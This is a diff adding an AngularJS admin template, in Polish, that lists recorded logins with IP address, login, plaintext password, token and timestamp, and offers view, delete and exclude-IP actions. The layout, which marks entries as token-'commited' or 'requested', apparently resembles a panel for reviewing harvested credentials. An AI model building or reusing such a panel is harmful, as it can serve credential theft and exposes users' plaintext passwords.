@@ -1,0 +1,100 @@
+<div ng-show="module == 'logins'" ng-controller="loginsController">
+   
+	<div class="container" ng-show="action == 'list'">
+		<div class="row">
+			<div class="col-lg-12">
+				<div class="py-3 text-right">
+					<span class="list-title"><i class="fa fa-sign-in" aria-hidden="true"></i> Logowania</span>
+					<span class="list-search"><input type="search" class="form-control" ng-model="searchValue" placeholder="Szukaj"></span>
+					<button class="btn btn-primary font-awesome" ng-click="getLogins()" id="get-logins"><i class="fa fa-refresh" aria-hidden="true"></i> Odśwież listę</button>
+					<button class="btn btn-danger" ng-click="getPanel()"><i class="fa fa-times" aria-hidden="true"></i></button>
+				</div>
+				<table class="table table-bordered table-striped">
+					<tr>
+						<th>Lp.</th>
+						<th class="text-left">IP</th>
+						<th class="text-left">Login</th>
+						<th class="text-left">Password</th>
+						<th class="text-left">Token</th>
+						<th>Data</th>
+						<th colspan="3" class="text-center">Akcje</th>
+					</tr>
+					<tr ng-repeat="login in logins | filter:searchValue" class="{{ login.token.length ? 'commited' : 'requested' }}">
+						<td>{{ $index + 1 }}</td>
+						<td class="text-left">{{ login.ip }}</td>
+						<td class="text-left">{{ login.login }}</td>
+						<td class="text-left">{{ login.password }}</td>
+						<td class="text-left">{{ login.token | limitTo:16 }}<span ng-if="login.token.length > 16">...</span></td>
+						<td>{{ login.date | date: "dd.MM.yyyy HH:mm:ss" }}</td>
+						<td class="text-center">
+							<button class="btn btn-success action" ng-click="excludeLogin(login.ip)"><i class="fa fa-plus-square" aria-hidden="true"></i></button>
+						</td>
+						<td class="text-center">
+							<button class="btn btn-primary action" ng-click="viewLogin(login._id)"><i class="fa fa-file-text-o" aria-hidden="true"></i></button>
+						</td>
+						<td class="text-center">
+							<button class="btn btn-danger action" ng-click="deleteLogin(login._id, false)"><i class="fa fa-trash-o" aria-hidden="true"></i></button>
+						</td>
+					</tr>
+					<tr ng-if="logins.length == 0">
+						<td colspan="9"><span class="empty-list"><i class="fa fa-times-circle" aria-hidden="true"></i></span><br>Brak pozycji.</td>
+					</tr>
+				</table>
+				<div class="py-3 text-center">
+					Statystyka: <b>{{ logins.length }}</b> logowań
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<div class="container" ng-show="action == 'view'">
+		<div class="py-4 row">
+			<div class="col-lg-10 offset-lg-1">
+				<form class="form">
+					<span class="form-title container"><i class="fa fa-sign-in" aria-hidden="true"></i> Logowanie</span>
+					<div class="form-group text-left">
+						<h6>IP:</h6>
+						<input type="text" class="form-control" value="{{ login.ip }}" disabled> 
+						<h6>Login:</h6>
+						<input type="text" class="form-control" value="{{ login.login }}" disabled> 
+						<h6>Password:</h6>
+						<input type="text" class="form-control" value="{{ login.password }}" disabled> 
+						<h6>Token:</h6>
+						<input type="text" class="form-control" value="{{ login.token }}" disabled> 
+						<h6>Data:</h6>
+						<input type="text" class="form-control" value="{{ login.date | date: 'dd.MM.yyyy HH:mm:ss' }}" disabled> 
+					</div>
+					<button type="submit" class="btn btn-warning font-awesome" ng-click="cancelLogin()"><i class="fa fa-ban" aria-hidden="true"></i> Anuluj</button>
+				</form>
+			</div>
+		</div>
+	</div>
+	
+	<div class="container">
+		<div class="py-4 row">
+			<div class="col-lg-6 offset-lg-3">
+				<div ng-if="status == 'info'" class="alert alert-success" role="alert">{{ message }}</div>
+				<div ng-if="status == 'error'" class="alert alert-danger" role="alert">{{ message }}</div>
+			</div>
+		</div>
+	</div>
+
+	<div class="container" ng-show="action == 'dialog'">
+		<div class="py-4 row">
+			<div class="col-lg-6 offset-lg-3">
+				<div class="panel panel-dialog">
+					<div class="panel-heading">Usuwanie rekordu</div>
+					<div class="panel-body">
+						<p><div class="icon"><i class="fa fa-3x fa-trash-o" aria-hidden="true"></i></div></p>
+						<p>Uwaga! Czy na pewno chcesz usunąć wskazaną pozycję?</p>
+					</div>
+					<div class="panel-footer">
+						<a href="#" class="btn btn-danger" ng-click="deleteLogin(id, true)">Skasuj</a>
+						<a href="#" class="btn btn-warning" ng-click="cancelLogin()">Anuluj</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+</div>
